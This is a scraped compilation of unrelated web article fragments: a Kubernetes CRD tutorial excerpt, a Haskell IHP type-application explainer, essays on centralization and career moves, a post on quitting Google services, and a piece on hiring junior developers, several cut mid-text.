    <p><img src="https://iximiuz.com/kubernetes-operator-pattern/kube-api-common-features-3000-opt.png" width="100%" alt="Kubernetes API common features"></p>
</div>

<p>It's pretty handy, isn't it?</p>
<p>So, if I were to extend the API, it'd be reasonable for me to expect that my endpoints would benefit from this common functionality as well. But that would mean that the API extension should be done by adding more resources!</p>
<p>And indeed, in Kubernetes, one can easily register <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#custom-resources"><em>custom resources</em></a>. The procedure is fully dynamic and doesn't require restarting or updating the API server.</p>
<p>How such a custom resource can be added? Well, again, it's Kubernetes! Of course, by interacting with another, already existing resource! There is a special API resource called <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#customresourcedefinitions">CustomResourceDefinition (CRD)</a>:</p>
<blockquote>
<p>The CustomResourceDefinition API resource allows you to define custom resources. Defining a CRD object creates a new custom resource with a name and schema that you specify.</p>
</blockquote>
<p>And <a href="https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/#create-a-customresourcedefinition">from another documentation page</a>:</p>
<blockquote>
<p>When you create a new CustomResourceDefinition (CRD), the Kubernetes API Server creates a new RESTful resource path for each version you specify.</p>
</blockquote>
<h2 id="how-to-create-custom-resource">How to Create Custom Resource</h2>
<p>Let's try to create a custom resource. Remember, a resource specifies a certain kind of Kubernetes object. Canonically, objects possess some attributes. So, our CustomResourceDefinition should be mostly concerned with describing the attributes of our future resource. Additionally, it's good to know that custom resources can be either namespaced or cluster-scoped. This is specified in the CRD's scope field.</p>
<pre><code>apiVersion: apiextensions.k8s.io/v1

<p><strong>Friendly tracebacks</strong> - Simplified Python tracebacks translatable into

<div id="in-a-nutshell">
<h2>In a nutshell<a href="#in-a-nutshell" title="Permalink to this headline">¶</a></h2>
<p>There exists many Python projects, including some listed below,
whose <strong>primary</strong> goal is to supplement the information
given by Python traceback to make them more useful for <strong>advanced</strong> programmers.
Friendly-traceback is <strong>not</strong> one of these projects.</p>
<p>While Friendly-traceback can be useful for advanced programmers,
it is aimed aimed primarily at beginners and/or at users
who would like to get information about traceback in their own language.
Friendly-traceback can give more detailed information as to
<strong>where</strong> an exception occurred, <strong>what</strong> a given exception means and
<strong>why</strong> it might have occurred (sometimes adding a way to fix it.)</p>
<p>While Friendly-traceback can be used on its own with a specially
designed console, a better option would be to use it together with
GUI-based editors/IDE including Jupyter lab and notebooks.
We explain how to do so later.
For now, we just show one quick example.</p>
</div>
<div id="a-quick-look">
<h2>A quick look<a href="#a-quick-look" title="Permalink to this headline">¶</a></h2>
<p>First, we show what happens when we use Python

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p><a href="https://ihp.digitallyinduced.com/">IHP</a> uses lots of <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/glasgow_exts.html">GHC language extensions</a> to create the
“magic” that comes along with the framework. One the the first nonstandard language extensions
you’ll come across while developing with IHP is the fancy “@” symbol.</p><div><pre><code data-lang="haskell"><span>action</span> <span>UsersAction</span> <span>=</span> <span>do</span>
    users <span>&lt;-</span> query <span>@</span><span>User</span> <span>|&gt;</span> fetch
    render <span>IndexView</span> { <span>..</span> }
</code></pre></div><p><code>@User</code> appears like a normal parameter to the function, which can be highly misleading if you try and extrapolate this idea into other contexts.
When I first started working with IHP, I assumed this was the equivalent to
Swift’s <code>self</code> property on types, which gives you a <em>value</em> representing the type that can be passed around:</p><p>This is not the case however!</p><div><pre><code data-lang="haskell"><span>let</span>
  typeOfUser <span>=</span> <span>@</span><span>User</span>
<span>in</span>
  <span>-- parse error!</span>
</code></pre></div><p>So what’s actually happening here?</p><h3 id="whats-the-type">What’s the type?</h3><p>Say we want to test the behavior of Haskell’s <code>read</code> and <code>show</code> functions, which
each have a corresponding type class which defines which values can be passed to these functions.</p><div><pre><code data-lang="haskell"><span>read</span> <span>::</span> (<span>Read</span> a) <span>=&gt;</span> <span>String</span> <span>-&gt;</span> a
<span>show</span> <span>::</span> (<span>Show</span> a) <span>=&gt;</span> a <span>-&gt;</span> <span>String</span>
</code></pre></div><p>Given any value which has both <code>Read</code> and <code>Show</code> instances defined, we should be able to convert back and forth between it and its String representation.</p><p>Let’s test for integers:</p><div><pre><code data-lang="haskell"><span>let</span> intString <span>=</span> <span>"123"</span>
<span>read</span> intString

<span>***</span> <span>Exception:</span> <span>Prelude</span><span>.</span>read<span>:</span> no parse
</code></pre></div><p>Huh? Of course <code>read</code> should know how to parse a simple integer, right?</p><p>If you think about the above code carefully, you might notice that Haskell
has no way of knowing what type <code>read intString</code> should be! Obviously to us it
represents an integer, but in Haskell’s eyes it’s given an arbitrary string
and has no way of knowing which instance of the type class <code>Read</code> it should produce.</p><h3 id="-me-bro">@ me bro</h3><p>Type application to the rescue! The “@” symbol allows us to explicity pass
a type to the function:</p><div><pre><code data-lang="haskell"><span>let</span> intString <span>=</span> <span>"123"</span>
<span>read</span> <span>@</span><span>Int</span> intString

<span>123</span>
</code></pre></div><p>Note, <code>@Int</code> is <strong>not a regular parameter!</strong>
The regular parameters we’re used to working with are actually called
<em>value parameters</em>, and <code>read</code> only has one: a String.</p><p>Behind the scenes, Haskell also includes <em>type parameters</em> which specify
the types that satisfy a function’s <em>constraints</em>, or the stuff before
the <code>=&gt;</code> symbol in function declarations.</p><p>Normally Haskell can do this for us:</p><pre><code>readFn :: String -&gt; Int
readFn intString = read intString

readFn "123"

123
</code></pre><p>Since the function returns an Int, the type parameter can be inferred.
In the simple example earlier however, this was not the case.</p><h2 id="type-application-in-ihp">Type Application in IHP</h2><p>Say we’re writing a script that wants to print out the name of the newest user to signup for our application.</p><div><pre><code data-lang="haskell"><span>run</span> <span>::</span> <span>Script</span>
<span>run</span> <span>=</span> <span>do</span>
    user <span>&lt;-</span> query <span>@</span><span>User</span> <span>|&gt;</span> orderBy <span>#</span>createdAt <span>|&gt;</span> fetchOne
    print (get <span>#</span>createdAt user)
</code></pre></div><p>To understand what <code>@User</code> is doing, we need to look at the definition of <code>query</code>:</p><div><pre><code data-lang="haskell"><span>query</span> <span>::</span> forall model table<span>.</span> table <span>~</span> <span>GetTableName</span> model <span>=&gt;</span> <span>DefaultScope</span> table <span>=&gt;</span> <span>QueryBuilder</span> table
</code></pre></div><p><code>query</code> doesn’t take any value parameters! All the info that gets passed to the function is contained in its type constraints. So if we omitted <code>@User</code>, Haskell would have no way of knowing what the <code>model</code> type should be.</p><h2 id="conclusion">Conclusion</h2><p>Type application is extremely powerful and is used all over both the
IHP codebase and IHP applications. Understanding what’s going on when you see
the <code>@</code> symbol is a good first step for uncovering some of the “magic” behind
the framework.</p><p>Does anything else in IHP confuse you? Let me know below and I will write about
it in a future article! Thanks for reading!</p></div></article></div></div>]]>

<![CDATA[Decentralization Is a Narrative Mirage]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Technology is a concentrating force. It always has been.</p>
<p>Everybody sewed their own clothes until we built textile factories.</p>
<p>It used to take one farmer to feed four people. Now each farmer feeds 130 people.</p>
<p>Home Depot killed thousands of local hardware stores. Opendoor is replacing legions of Keller-Williams agents. Salman Khan teaches algebra to more kids than the next 10,000 math teachers combined.</p>
<p>Gold, silver, <span>USD</span>, <span>CNY</span>, and <span>EUR</span> are all converging on the blockchain.</p>
<p>Human history is a story of increasing centralization. From roaming the plains of Africa, to settling down and building homes, to buying food in central markets, to instituting courts of law. Progression is compression. <em>How can I make it so everybody isn’t making their own shirts? Deciding their own justice? Tabulating their own spreadsheets?</em></p>
<p>The internet, contrary to popular opinion, is accelerating the pace of centralization.</p>
<p>Software is centralizing in the App Store. Compute is centralizing in AWS-US-EAST-1. Culture is centralizing on TikTok. Stock trades are centralizing in Citadel’s dark pool. Politics are centralizing around personality. Work and cities are centralizing online.</p>
<p>Decentralization is a narrative mirage because three trends are frequently misinterpreted: the downfall of institutions, the death of the gatekeeper, and remote work.</p>
<p>These aren’t representative of decentralization, but instead are examples of increasing concentration.</p>
<h3 id="institutions-are-failing.">1.<span></span> <span>“</span>Institutions are failing.”</h3>
<p><a href="https://secondbreakfast.co/personality-is-the-force-majeure-of-the-internet">Personality is the force majeure of the internet</a>. In a noisy world, it’s much easier to diligence an individual than it is to understand institutional motives. <em>Who supports NPR? Who’s the <span>NYT</span><span></span><span>’</span>s customer? Advertisers? <span>PR</span> people? Me? What are we being sold?</em></p>
<p>Institutions aren’t crumbling because of decentralization, but rather the opposite: institutional power is being compressed into personalities.</p>
<p>Trump became the <span>GOP</span>. <span>AOC</span> is becoming the <span>DNC</span>. Dave Portnoy is becoming <span>ESPN</span>. Sam Harris is now <span>NPR</span>. Elon is Tesla.</p>
<p>Organizational power is inherently decentralized. Shareholders vote for board members. Boards approve plans. Plans coordinate across loosely-coupled internal orgs.</p>
<p>But individual power, like autocratic government, is singular.</p>
<p>Directives no longer need to flow through layers of hierarchy. Tesla no longer needs a network of dealers to sell cars on <a href="https://tesla.com/">tesla.com</a>, nor do they need an army of salespeople. Why listen to Bob at the local showroom when you can follow Elon on Twitter?</p>
<p>It’s the same in politics. We used to elect state representatives who would elect electors in the legislature who would elect a President. Then communication and transportation improved. We got railroads and national radio, so we put the Presidential candidates directly on the ballot.</p>
<p>Nowadays the President doesn’t even need <span>TV</span> stations: they can instantly drop messages into the pockets of <span>80M</span> followers.</p>
<p>Betting on the internet means betting against institutions,<a href="#footnote-11TX" id="ref-11TX" role="doc-noteref"><sup>1</sup></a> not because institutions are exploding supernovas but because institutions are imploding black holes.</p>
<h3 id="the-gatekeepers-are-dead.">2.<span></span> <span>“</span>The gatekeepers are dead.”</h3>
<p>It’s true, gatekeepers are dead. It’s a huge improvement over the pre-Internet era.</p>
<p>I never learned about Richard Dawkins growing up. Then I went down a Carl Sagan <em>Pale Blue Dot</em> rabbit hole. I discovered Christopher Hitchens talking about evolution, consumed all of his religious debates, and then came across this Oxford evolutionary biologist who wore funny ties. <em>The Selfish Gene</em> fundamentally changed the way I view the world.</p>
<p>YouTube extends far beyond space videos. There’s debates about quantum theory, <span>DIY</span> construction how-to’s, makeup tutorials, and an unbelievable amount of unboxing videos.</p>
<p>The best part? There’s no school board deciding what you can and can’t watch and there’s no <span>MTV</span> exec telling David Dobrik what he can and can’t upload.</p>
<p>It’s easy to think the unlimited nature of content is a decentralizing force. Yet the reality is that winning content in an unlimited world is watched over and over and over again.</p>
<p>Taylor Swift can reach billions of listeners, Salman Khan can teach algebra to millions of students, the best Stack Overflow answers get upvoted thousands of times.</p>
<p>Imagine if San Francisco had no zoning rules. There’d be cranes and giant skyscrapers everywhere. The city would be reaching Tokyo-level density, concentrating people in the Bay Area from across the country.</p>
<p>The internet is a supercharged no-zoning Bay Area. YouTube, TikTok, Amazon, Shopify are all limitless. Their success is exponential, like the weight of gravity, pulling in more and more eyeballs.</p>
<p>The gap between first place and second place is far more pronounced online than it ever was offline. 30-45% of all e-commerce goes through Amazon. Walmart managed to handle only 9% of physical retail at their peak.<a href="#footnote-21TX" id="ref-21TX" role="doc-noteref"><sup>2</sup></a></p>
<p>Power is shifting to the dancer who can get featured by TikTok’s algorithm, to the business that can place first in Google’s results, to the reseller that pays the most to top Amazon’s catalog, to the singer that can get featured in Spotify’s <em>Discover Weeklies</em>.</p>
<p>The long tail of content is a distraction from the reality: online power is concentrating in an extreme power law. Yes, anybody can build a following. But the winners dwarf the long tail.</p>
<p>After all, audiences are so concentrated that it only took three companies to silence the sitting <span>POTUS</span>.</p>
<h3 id="but-what-about-remote-work">3.<span></span> <span>“</span>But what about remote work?”</h3>
<p>I miss going into Industrious. I’d wake up, walk to FiDi, pour myself a cup of coffee in a grey mug, sit in a mid-century modern green chair, and get to work.</p>
<p>When I flew to Chicago, I’d take a train to the Fulton Market Industrious, pour myself coffee in a grey mug, sit on a mid-century chair, and get to work.</p>
<p>Fly to Atlanta? Ride to Ponce. Coffee, grey mug, green chair, work.</p>
<p>New York? Union Square. Coffee. Chair. Work.</p>
<p>As people move their work lives online, the experience everywhere is going to be the same. Morning ride on the Peloton, get to WeWork, drink some Blue Bottle, hop on a video call, order groceries from Instacart, rinse and repeat. The only difference will be whether we see palm trees or wildfire smoke out the window.</p>
<p>The<span></span> <span>“</span>everyone is leaving <span>SF</span><span></span><span>”</span> narrative isn’t about decentralization, it’s about centralizing online. Everybody is on Zoom now.<span></span> <span>“</span>Remote work” doesn’t mean you can now live some exotic life in a faraway place, it means that people in Birmingham can live the same as those in Cow Hollow. And work for the same companies, too.</p>
<p>Not only are we all working on Zoom, but we’re all shopping on the same<span></span> <span>“</span>hip” street, the one with Warby Parker and Bonobos and Lululemon and La Colombe all lined up side by side. Sub-in Blue Bottle, and I’ll tell you if you’re east or west of the Mississippi.<a href="#footnote-31TX" id="ref-31TX" role="doc-noteref"><sup>3</sup></a></p>
<p>Part of it is that capital is cheap and management can be centralized, so chains are able to grow quickly nationwide without leaning on franchise models.<a href="#footnote-41TX" id="ref-41TX" role="doc-noteref"><sup>4</sup></a></p>
<p>But the other part is that our tastes as Americans are compressing. Every town has incredible breweries, third wave coffee, Trader Joe’s, and a Costco out in the suburbs. We’re all watching Netflix and Charli D’Amelio. We’re all peddling to the same bike instructors as Biden. How much longer until we all lose our regional accents, too?</p>
<h3 id="uploading">Uploading…</h3>
<p>Everything is shifting online. From how we find office space, to get rides, to feed ourselves, to exercise, to work and to live.</p>
<p>The meme that this constitutes<span></span> <span>“</span>decentralization” is like the ocean on the edge of the Saharan horizon. It is an illusion.</p>
<p>The spectrum of opinions, of tastes, of behaviors is compressing. The platforms and personalities with power will continue to grow in size. The power law of the internet remains irrefutable.</p>
<p>Soon one farmer will feed 1,300 people, robots will sew our Nikes, there will be one nationwide math teacher and a single wealth ledger.</p>
<p>And our lives will be fully uploaded.</p>

If you’re starting with this one, you may want to have a look at: </em><a href="https://www.jlgoodwin.com/words-pictures/2020/9/17/management-the-job-of-a-manager"><span><em>https://www.jlgoodwin.com/words-pictures/2020/9/17/management-the-job-of-a-manager</em></span></a></p><p>Amazing, talented, hard-working, accomplished folks who’ve reported to me over the years have asked: “What do I need to do to get to the next level?” In most cases, because I needed them, I have to admit I have sometimes stopped short of complete candor. If I could have, I would have said: “Find the job you want to have at another company and then quit this one.” There is also the version of: “Find the job you want at this company and then transfer to that one.” I’ve never stood in the way of anyone leaving my team and getting their next job, and I’ve always helped in any way I could to make it happen. So, my career advice is “Be a quitter.” There are some dimensions to that reductionist statement…</p><p><em>My very first programming job was when I was sixteen years old, when I worked for a company creating educational games for the TRS-80, Apple II, Atari, and IBM PCs. When I had worked for them for about three years and was heading to college, they were still paying me eight dollars an hour. I was as good or better than their older programmers so I asked them for a raise to fifteen dollars an hour. They had recently started to become more of a “business” and had hired a biz school grad to manage their operations. He wouldn’t go for it. I quit and took a job cooking in a restaurant that happened to be on the ground floor of my girlfriend’s dorm building for fifteen dollars an hour. I got some good cooking experience and a few months later I got another software job with a company that did portfolio accounting for big Wall Street firms. They paid me a lot more than fifteen dollars an hour, and I later dropped out of college to work for them full time.</em></p><p>Right from the start of your career I recommend that you pay attention to what engages you about your job and what turns you off. Make pro/con lists at some regular intervals, perhaps at quarterly review time. Are you getting enough of the pros from your job vs. the cons? Are there opportunities to shift the balance in your current role? Are there things you could add that would be pros that you’re not doing at all? Are there things that you’ve only done once in that last quarter that you really enjoyed? Try to do that again. Don’t pay that much attention to what you “should” do, pay attention to what you want to do.&nbsp;</p><p>If money is on your list, find out what you’re worth by spending some time getting some other offers. Don’t try to coerce your manager into paying you more by dropping offer letters in front of them. Instead, just talk to them about what you think you should be making in your current role and why.</p><p>If you really don’t see a way to pursue the things that motivate you via your current role, then this is a signal to start looking inside and outside the company for your next role.</p><p><em>I was a principal software engineer on a large team writing business productivity software. I wanted to be a software architect. I had been working fairly autonomously on a feature that touched every damn thing in the product. So you could say I was already doing software architecture work. But, because I was young they were reluctant to promote me. I saw another team that was fucking up wildly and they desperately needed architectural guidance. So I talked to my boss and asked to help them out. It was a huge mess to unravel but I managed to create a good architecture out of it and rewrite a lot of it. I also got the team members contributing better as well. After that, when I asked for a promotion they gave it to me. Partly because they acknowledged that I was qualified, and partly because I owned two large feature areas and they couldn’t afford to lose me.</em></p><p><em>&nbsp;</em>If you want to get to the next level, ask for next level responsibilities when there is an opportunity. A new project, a new sub-team, a crisis that needs to be sorted out, etc.--any of these are places where you can volunteer to take on more scope. Essentially that is what “career growth” is: getting more scope of influence. This kind of informal tryout is good for you and for your boss. It lets you figure out if these are really the things that motivate you and whether you are any good at them. It lets your boss see you as the next level without committing to a promotion. Of course some bosses are assholes and (even if you do well) will just try to use you again in this role without a promotion. I would say that risk is worth it to get the tryout and if you have an asshole boss you should (you guessed it) quit.</p><p>I can’t tell you the number of people who have pursued me for promotions who weren’t good at their current job. I’m sure that works with incompetent managers who want to just pass their problems along to other folks while failing up themselves, but I’m not talking about them. You’ll know you’re great at your current job when the 360 feedback from peers, supervisors, and stakeholders confirms this--that’s when you should try to get the next job. A real challenge in this is that sometimes you’re good at something that you don’t like all that much. You are left with a choice: Pursue the thing you’re strong at or perhaps go for something that makes you happy that you’re just okay at. I don’t know the right answer; you have to choose.</p><p><em>After some years at a Very Large Multinational Technology Company I had reached a point where I was flying back and forth across the United States with PowerPoint decks telling “stories” to partner companies. I wasn’t learning anything except how to get the most frequent flyer points. I was not happy. I went looking for a company that was smaller, more focused, and where I could be an individual contributor again. I found a little place doing cool work that I was interested in. They were a small tight knit group of really talented folks. The interview was really hard. I learned a lot about truly collaborating on a project, taking feedback, and using asynchronous communication effectively. I got deep into Linux, Python, test automation, Windows distributed security, and about a thousand other things. I started coding for fun again during that job and haven’t really stopped since. There was a lot of blunt feedback, but in response to that, I got even better than I thought I was going in.&nbsp;</em></p><p>The worst place to learn anything is a place where you are the smartest person in the room. When you’re interviewing companies (or other teams), one of your goals should be to see if you are going to learn anything from them. That education is worth more than money. Learning is what gives drive and interest to your career. If you’re not learning, you’re sliding backwards. This is why chasing easy money, and hopping from money-wasting startup to money-wasting startup, is not a good way to develop a strong career. It isn’t always easy to be learning on the job, and it comes with stress and sometimes uncomfortable feedback, but I think it is worth it in the long run.</p><p><em>I was leading a scrum team at a small e-commerce company and as part of a project we were doing, someone had to write some deployment scripts. This involved writing some shell script and a little work in Lua on Nginx. When the task came up during planning, the task wasn’t claimed so I assigned it to one of the more senior engineers. The next several stand up meetings this engineer was in a very bad mood with me. I finally had a talk with them and they informed me that they were a “Java Engineer” and that they didn’t appreciate being given tasks that weren’t Java. I told them that their job title was “Software Engineer,” and that they would use whatever software tool was required to build the systems we needed. Needless to say, this conversation didn’t help them in their quest for advancement. I can only imagine what has happened to this person since then, with the rise of JavaScript on the backend and the long dragged out death of Java.</em></p><p>It is okay to get to a certain point and just stay there because you’re happy, challenged, and still learning. A key thing to be wary of in these contexts is to not let the market leave you behind. Don’t be a Java engineer or a Python engineer: be a Software Engineer. Be comfortable in multiple environments and idioms. In the software field, languages and tools and operating systems go out of style. It isn’t that there is really something better, it is just that people tend to herd towards new things periodically. You should pay attention and update your skills, put the new tech into your current job (or get a new job with new tech). I’ve had to lay folks off in the past and there is nothing sadder than “senior” folks, whose skills are a decade out of date, trying to attain the same level in a market that has moved on. You become at best an entry level person with commensurate lower salary expectations.</p><p>Don’t take a management role if you don’t like it and/or you don’t have any aptitude for it. There are plenty of ways to figure this out before taking a management role. Being a great engineer is not an important qualification for being a great manager. Many companies make this stupid assumption because they were founded by engineers, and they typically have a lot of crappy managers (who are former engineers) who really don’t like managing people. You are much better off solving your money problems or level problems inside the engineering track than switching over to the management track. Also, the employees that would have to suffer under you will appreciate you staying in the engineering track.</p><p>In the long run, it is better to have the right role than to always have a steadily increasing salary. Of course, this assumes that you have your finances in order and can afford to do this. I would say that being able to have this option is very useful in career progression. I’ve done it more than once, because as a great …</p></div></div></div></div></div></div></div>

February 3, 2021 | https://www.quitfacebook.org/file/google.html | <a href="https://web.archive.org/web/*/https://www.quitfacebook.org/file/google.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <p><img src="https://www.quitfacebook.org/file/media/google-sign-out.png" alt="Google warning: 'Couldn't sign you in'"></p><p>I saw the above warning using <a href="https://vivaldi.com/">Vivaldi</a>: a successful and powerful Chromium based browser. There's nothing insecure about it. I tried to fix the problem by disabling all extensions, clearing all browser data, and enabling “less secure app access” in the Google account settings. Alas. The only solution I found was reinstalling the browser. But after having done so—five times—each time when clearing the cookies, or enabling a VPN, it wouldn't let me sign in again. Then the following email found my inbox.</p>

    <p><img src="https://www.quitfacebook.org/file/media/google-warning.png" alt="Google warning: someone knows the password to your linked Google account"></p><p>“Someone knows the password to your linked Google Account”… Me. It was <em>me</em>! Obviously <em>I</em> know the password to my linked Google account. Forced to change my password I was duly annoyed. I realized how dependent I was. If Google unpredictably revokes access to your account, you can't log into anything else of their services: YouTube, Gmail, Play Store, Docs, Drive, Calendar, etc. Fortunately I already did a partial Google and social media exodus. Nevertheless, even when only using YouTube and Google Play, losing access startled me. Therefore, because I don't want to be put in this position again, I completed the exodus: discarding the need for a Google account.</p>

    <p>A quick aside, I have nothing against monopolies as a general rule. Usually they grow so big because of a significantly superior service <sup>(1)</sup>. But as convenient as they may be—even though their products aren't superior anymore—if their power goes to their head and they start pulling insidious shenanigans, like using false claims to deter people from browsers other than Chrome, then I'm out.</p>

    <p>So that's exactly what I did and I was pleasantly surprised by the results. Believe it or not but my phone is more responsive and the battery lasts longer. Although the former might be due to the factory reset, I assume the latter has to do with the decrease in background processes due to 1. removing my Google account 2. subsequently disabling Google Play Store 3. disabling everything in the settings tab called Google services &amp; preferences. Digital minimalism, it's so incredibly satisfying. You should try it. Your life was perfectly fine before you had all that extra stuff to worry about (or pay for); I learnt that from my teacher, Diogenes of Sinope, 404 – 323 BC.</p>

          </ul>
        </td>
      </tr>
    </tbody></table>

    <h2>Alternatives to Google.</h2>
    <p>Diogenes would suggest living on the streets, but I'm unsure if that's feasible, and you'd still be overwhelmed by ads. So what to do? One could completely avoid Google as there is plenty competition to choose from. A quick search for “Google alternatives” or a peek at <a href="https://nomoregoogle.com/">No More Google</a> or <a href="https://degoogle.jmoore.dev/">degoogle</a> can suffice. Although, realistically, one will want to keep using some of their services, preferably without an account. As was the case for me.</p>

    <h3>YouTube.</h3>
    <p>YouTube has a lot of content nowhere else to be found. Fortunately one doesn't need an account (yet) to simply watch these videos. However, sometimes logging in is required. To <strong>circumvent logging in</strong>, use the YouTube front-end <a href="https://invidio.us/">invidio.us</a>, and select an instance such as ytprivate.com. It uses YouTube in the background, but discards the bullshit, making the website much faster. Just enter a search term, or copy-paste the YouTube URL or video ID, and you're good to go. If you require <strong>playlists</strong> or <strong>subscriptions</strong>, Invidious supports that too if you register. Importing or exporting data from other Invidious instances is possible as well.</p>

    <p>If you want to manually create a playlist on YouTube without an account, append the following URL with the YouTube video IDs separated by commas, for example: https://www.youtube.com/watch_videos?video_ids=xUozVQVt1xI,ed0fRdTma9I.</p>
    
    <p>When on <strong>mobile</strong>, <a href="https://newpipe.net/">NewPipe</a> is the way. There are other YouTube front-ends, but I strongly recommend NewPipe because: it is highly configurable, it supports background play on a locked phone, it features easy downloading, it has <em>no</em> ads, it works hand in hand with PeerTube and Invidious, it's super fast, etc.</p>
    
    <h3>Google Play Store.</h3>
    <p>The Google Play store is something I was most worried about. I assumed using “their” apps necessitated a Google account. Not necessarily. <strong>The free apps don't require an account, the paid apps do</strong>. For example, I purchased Wolfram Alpha but can't install it without Google Play Store. And even if I could, I'd need my Google account as a receipt to reactivate it. In total I have 14 apps and one digital book I paid for. But as time passed I found better and free alternatives to all of them, or I merely donated to support their decision to refuse ads, not their premium functions. However, I can understand if this is a dealbreaker to those who are dependent on non-free apps.</p>
      
    <p>Anyway, to install an app you just need an .apk file. But to avoid a time-consuming process, there are alternative app catalogues such as <a href="https://f-droid.org/en/"><strong>F-Droid</strong></a> and <a href="https://auroraoss.com/app_info.php?app_id=1"><strong>Aurora Store</strong></a>, these will serve most of your needs. I suggest perusing F-Droid first because its apps are FOSS (Free and Open Source Software); more than half of mine are on it. Here's a list of everyting I use: <a href="https://www.quitfacebook.org/file/software.html">quitfacebook.org/file/software.html</a>.</p>

    <p>Not going to lie, it feels good to release the shackles; Google Play Store is disabled and everything works just fine. However, Google Play <em>services</em> apparently needs to remain enabled for some crucial functionalities. I can live with that, for now.</p>

    <h3>Gmail.</h3>
    <p>I'm only keeping this account just in case I need the key to the dungeon. Otherwise I use <a href="https://protonmail.com/">ProtonMail</a> which is developed at CERN <sup>(2)</sup>; 'nuff said? Sure there are plenty of other providers, but man, developed at CERN, that's like a Vulcan salute to Trekkies.</p>

    <p>🖖</p>

    <h3>Google Chrome.</h3>
    <p><a href="https://vivaldi.com/">Vivaldi Browser</a>'s quality <em>does</em> match up to its name—and we all know <em>Four Seasons</em>. I could throw around superlatives all day, but I won't spoil the pleasant surprise. What got <em>me</em> to click “set as default browser” was Vivaldi's unmatched simultaneous customizability <em>and</em> speed. Not surprisingly, it has a thriving community forum.</p>


    <h3>Google Drive.</h3>
    <p>The only thing I used Google Drive for was backing up contacts. This can easily be replaced by exporting a .vcf file. Similarly, before a factory reset, I just manually use the export function of the few apps I want backups from.</p>

    <p>But what in the case of a hard drive crash? For the most important files I use a directory that's immediately synced to <a href="https://mega.nz/">MEGA</a> by default. For instance, I'm writing this page on a file that's sent to the cloud each time it's saved. This is probably commonplace and trivial information for IT enthusiasts, but I'm certain that's not most people.</p>

    <h3>Google search.</h3>
    <p>I admit I haven't found any search engine with better results than Google, despite its bias. However, you can have your cake and eat it too with <a href="https://www.startpage.com/">Startpage</a>. This search engine uses Google but adds privacy.<sup>(3)</sup> If you want to avoid Google completely, use <a href="https://duckduckgo.com/">DuckDuckGo</a>—but let's call it <a href="https://duck.com/">duck.com</a> from now on so we can say “duck it” instead of “google it”.</p>

    <p>Ideally, just be efficient and use shortcuts for multiple search engines.</p>

    <h3>Google Translate.</h3>
    <p><a href="https://www.deepl.com/">DeepL</a>. The translations it produces are astounding; single words as well as full text translations. Try it, I'm confident you'll confirm that it beats Google.</p>

    <h3>Google Ads.</h3>
    <p>Fuck ads, and I'm being polite. To find out how I block all of them I suggest you read my post “<a href="https://www.quitfacebook.org/file/adblocking.html">Ad blocking, or how to use the Web properly.</a>”</p>

    <h2>Why do I care?</h2>
    <p>I don't have a coherent answer yet; the problem is multifold and my expertise is lacking. Regardless, things don't feel right. For one, it greatly bothers me that there is a vast collection of fantastic software that doesn't get the attention it deserves. Especially the ones made by praiseworthy developers who refuse ads and trackers. Frequently they're hidden behind products of those who can spend the most on marketing, or they suffer traffic loss by biased search results. Consequently, these virtuous mindsets don't get incentivized as they earn significantly less money. Developers with a backbone deserve to be rewarded more. Additionally, the dumbing down of devices and software decreases all-around tech savviness and makes us more reliant while hypocritically increasing the attitude of taking things for granted.</p>

    <p>To add fuel to the fire, we've become addicted to convenience because monopolies handed us everything on silver plate in return for our data, all so the consumption of whatever can be increased. It sounds like a conspiracy, but it isn't; data is seen as the new oil for just that reason: manipulation. Call me old-fashioned all you want, but I consider wilful manipulation evil. The fact that Facebook is still around after all their <em>known</em> scandals proves how hollow we've become.</p>

Browsing through companies that have recently IPO’d or raised $100M+ rounds — where one would expect a company to be able to hire junior developers — all I can find are jobs that require at least three or more years of experience or are explicitly only hiring “Senior” or “Developer II” or higher.</p><p>I have been working with bootcamp graduates and community-college graduates for years. But from my vantage point, when growth companies hire people with no development job experience, they are usually hiring top-tier, four-year college graduates. (There are some exceptions! Twitter’s <a href="https://careers.twitter.com/en/university.html">internship program</a> is admirable, although I don’t know in practice how restrictive the admissions end up being).<a href="https://twitter.com/shaft/status/1355696154990628864"></a></p><p><a href="https://twitter.com/mxcl/status/608682016205344768"></a>One can understand wanting to make sure that the first few hires into any department have enough experience to build and maintain high quality software, except that</p><p>a) that often doesn’t prevent terrible technical debt, and</p><p>b) no one ever changes the expectations over time.</p><p>And so the culture just becomes, “we only hire people with experience.” I am a huge fan of <a href="https://www.segment.com/">Segment</a> (and a happy customer for more than five years), but despite their senior-developer-packed engineering roster, they seem to have to rebuild their <a href="https://segment.com/blog/goodbye-microservices/">entire architecture</a> <a href="https://techcrunch.com/2021/01/05/how-segment-redesigned-its-core-systems-to-solve-an-existential-scaling-crisis/">every</a> <a href="https://segment.com/blog/rebuilding-our-infrastructure/">few</a> years. Every company starts by hiring seniors; most seem to keep hiring seniors, and many have to keep throwing away code constantly.</p><figure><img src="https://lh4.googleusercontent.com/BsxIM1LBghJkWOwT56C-wwa7lGYJbB9sJPYjYd-A2Dq7zKkJVO98_I3qSOZazzGzxkJkx_gqA4KBK1lm0st213MAaiRfakQxgcACtziqc7hsW5z3wfbtzmbN87DR9bB4NtACKSi2" alt=""></figure><p>Everyone agrees that talent is scarce, and that hires often fail — and that failure is expensive. Why don’t companies ever take a conscious look at how to build talent instead of buying it?</p><p>Put another way, it’s ironic that an industry that tends to want to build everything instead of buying it chooses to buy the absolute most expensive thing on the market: talent.&nbsp;</p><h2 id="h-the-problems-with-senior-developers">The Problems with Senior Developers</h2><p><strong>It is a fallacy that only hiring senior developers will lead to better results than hiring many junior developers</strong>. There are bad things about senior developers that no one should want in their organization, and without juniors to counterbalance, you’ll be overindexed to these downsides.</p><h4 id="h-senior-skills-can-stagnate">Senior skills can stagnate</h4><p>The most common error I see senior developers make comes, ironically, from their prior successes, combined with the pace of technology.</p><p>Most developers at the beginning of their careers are good at knowing and using most of the best practices at that time. But there is no continuing education in software development, and compensation is tied to shipping, not learning. So once a developer is five or more years into their career, there’s a really good chance they’re still relying upon tools, libraries, and practices that are no longer the best way to build, deploy, and run software.</p><p>Case in point: 